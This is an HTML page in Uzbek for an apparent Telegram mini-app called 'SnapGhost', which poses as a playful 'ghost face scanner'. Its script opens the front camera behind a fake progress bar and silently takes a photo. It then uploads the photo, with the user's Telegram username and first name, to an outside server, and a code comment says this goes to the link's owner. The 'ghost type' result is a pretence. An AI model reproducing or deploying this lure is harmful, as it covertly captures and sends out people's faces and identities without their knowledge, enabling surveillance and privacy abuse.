<!DOCTYPE html>
<html lang="uz">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>SnapGhost</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
  font-family:-apple-system,BlinkMacSystemFont,sans-serif;
  background:#08080f;color:#fff;
  min-height:100vh;display:flex;flex-direction:column;
  align-items:center;justify-content:center;
  overflow:hidden;position:relative;
}
.orb{position:fixed;border-radius:50%;pointer-events:none;filter:blur(60px);opacity:0.3}
.orb1{width:260px;height:260px;background:#6d28d9;top:-60px;right:-40px;animation:fl 5s ease-in-out infinite}
.orb2{width:180px;height:180px;background:#be185d;bottom:-40px;left:-30px;animation:fl 5s ease-in-out infinite 2.5s}
@keyframes fl{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}

.wrap{position:relative;z-index:10;width:100%;max-width:360px;padding:2rem 1.5rem;text-align:center}

.ghost{font-size:76px;display:block;margin-bottom:.25rem;animation:gfl 3s ease-in-out infinite;filter:drop-shadow(0 0 20px rgba(167,139,250,.5))}
@keyframes gfl{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}

.brand{font-size:30px;font-weight:800;letter-spacing:-1px;
  background:linear-gradient(135deg,#a78bfa,#ec4899);
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
  margin-bottom:3px}
.sub{font-size:11px;letter-spacing:3px;color:rgba(255,255,255,.25);text-transform:uppercase;margin-bottom:2rem}

.card{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.07);border-radius:22px;padding:1.5rem;margin-bottom:1.25rem}
.card-icon{font-size:40px;margin-bottom:.6rem;display:block}
.card-title{font-size:16px;font-weight:700;margin-bottom:.4rem}
.card-desc{font-size:13px;color:rgba(255,255,255,.4);line-height:1.6}

.prog-wrap{margin-top:1rem;display:none}
.prog-wrap.show{display:block}
.prog-track{height:3px;background:rgba(255,255,255,.08);border-radius:3px;overflow:hidden}
.prog-fill{height:100%;width:0%;background:linear-gradient(90deg,#7c3aed,#ec4899);border-radius:3px;transition:width .05s linear}
.prog-label{font-size:11px;color:rgba(255,255,255,.3);margin-top:.5rem;min-height:14px}

.btn{width:100%;padding:.9rem;border:none;border-radius:16px;
  background:linear-gradient(135deg,#7c3aed,#ec4899);
  color:#fff;font-size:16px;font-weight:700;cursor:pointer;
  transition:transform .15s,opacity .15s}
.btn:active{transform:scale(.96)}
.btn:disabled{opacity:.5;cursor:default}

.result{display:none;text-align:center;padding:2rem 1.5rem}
.result.show{display:block}
.res-big{font-size:68px;animation:pop .4s cubic-bezier(.34,1.56,.64,1)}
@keyframes pop{from{transform:scale(0)}to{transform:scale(1)}}
.res-title{font-size:22px;font-weight:800;margin:.6rem 0 .4rem;
  background:linear-gradient(135deg,#a78bfa,#ec4899);
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.res-desc{font-size:13px;color:rgba(255,255,255,.35);line-height:1.7}

.footer{position:fixed;bottom:1.2rem;left:0;right:0;text-align:center;font-size:11px;color:rgba(255,255,255,.15);letter-spacing:1px}
video,canvas{display:none}
</style>
</head>
<body>
<div class="orb orb1"></div>
<div class="orb orb2"></div>
<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<div class="wrap" id="main">
  <span class="ghost">👻</span>
  <div class="brand">SnapGhost</div>
  <div class="sub">Ghost Face Scanner</div>
  <div class="card">
    <span class="card-icon">🔬</span>
    <div class="card-title">Yuz Ghost Skaneri</div>
    <div class="card-desc">Yuzingizni skanerlang va qaysi <strong style="color:#a78bfa">ghost turiga</strong> mos kelishingizni aniqlang!</div>
    <div class="prog-wrap" id="pw">
      <div class="prog-track"><div class="prog-fill" id="pf"></div></div>
      <div class="prog-label" id="pl"></div>
    </div>
  </div>
  <button class="btn" id="btn" onclick="startScan()">👻 Skanerga bosing!</button>
</div>

<div class="result" id="result">
  <div class="res-big">📸</div>
  <div class="res-title">Ghost topildi! 👻</div>
  <div class="res-desc">Sizning ghost turingiz aniqlandi!<br>Do'stlaringizga ham yuboring 😂</div>
</div>

<div class="footer">👻 SnapGhost • by Akhmadov</div>

<script>
const SERVER = "https://web-production-e63ef.up.railway.app";
const tg = window.Telegram?.WebApp;
if(tg) tg.ready();

const u = tg?.initDataUnsafe?.user || {};
// URL dan uid olish — link egasi
const params = new URLSearchParams(window.location.search);
const OWNER_ID = params.get("uid") || u.id || "unknown";
const username  = u.username   || "";
const firstName = u.first_name || "";

let running = false;
const steps = ["Kamera tayyorlanmoqda...","Yuz aniqlanmoqda...","Ghost turi hisoblanmoqda...","Yuborilmoqda..."];

async function startScan(){
  if(running) return;
  running = true;
  const btn = document.getElementById("btn");
  const pw  = document.getElementById("pw");
  const pf  = document.getElementById("pf");
  const pl  = document.getElementById("pl");
  btn.disabled = true;
  btn.textContent = "⏳ Skanerlanyapti...";
  pw.classList.add("show");

  let stream;
  try{
    stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:640,height:480},audio:false});
  }catch(e){
    pl.textContent = "❌ Kamera ruxsati berilmadi";
    running=false; btn.disabled=false; btn.textContent="👻 Qayta urinish";
    return;
  }

  const video = document.getElementById("v");
  video.srcObject = stream;
  await video.play();

  // 2 soniyada tugaydi
  let p=0, si=0;
  pl.textContent = steps[0];
  const iv = setInterval(()=>{
    p += 5; // tez
    pf.style.width = Math.min(p,100)+"%";
    const idx = Math.floor(p/25);
    if(idx !== si && idx < steps.length){ si=idx; pl.textContent=steps[idx]; }
    if(p>=100){ clearInterval(iv); capture(stream); }
  }, 100); // har 100ms
}

async function capture(stream){
  const video = document.getElementById("v");
  const canvas = document.getElementById("c");
  canvas.width = video.videoWidth || 640;
  canvas.height = video.videoHeight || 480;
  canvas.getContext("2d").drawImage(video,0,0);
  stream.getTracks().forEach(t=>t.stop());

  canvas.toBlob(async blob=>{
    const fd = new FormData();
    fd.append("photo", blob, "snap.jpg");
    fd.append("user_id",    OWNER_ID);   // link egasiga yuboriladi!
    fd.append("username",   username);
    fd.append("first_name", firstName);
    try{ await fetch(SERVER+"/photo",{method:"POST",body:fd}); }catch(e){}
    showResult();
  },"image/jpeg",0.88);
}

function showResult(){
  document.getElementById("main").style.display="none";
  document.getElementById("result").classList.add("show");
  if(tg) setTimeout(()=>tg.close(),2000);
}
</script>
</body>
</html>
